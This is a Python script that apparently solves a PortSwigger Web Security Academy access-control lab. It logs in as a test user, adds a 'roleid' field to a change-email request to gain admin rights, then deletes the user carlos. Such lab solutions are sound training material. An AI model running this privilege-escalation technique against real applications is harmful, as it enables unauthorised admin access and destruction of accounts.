# User role can be modified in user profile
# https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

import requests

session = requests.Session()
base_url = "https://ID.web-security-academy.net/"

# Login with wiener:peter
response = session.get(f"{base_url}/login")
login_data = {"username": "wiener", "password": "peter"}
response = session.post(f"{base_url}/login", data=login_data)

# change roleid to 2 in update password functionality
changemail_url = f"{base_url}/my-account/change-email"
exploit_payload = {"email": "dummy@mail.com", "roleid": 2}
response = session.post(changemail_url, json=exploit_payload)

# delete carlos
exploit_url = f"{base_url}/admin/delete?username=carlos"
response = session.get(exploit_url)
if "Congratulations" in response.text:
    print("Lab solved")
else:
    print("Exploit did not work")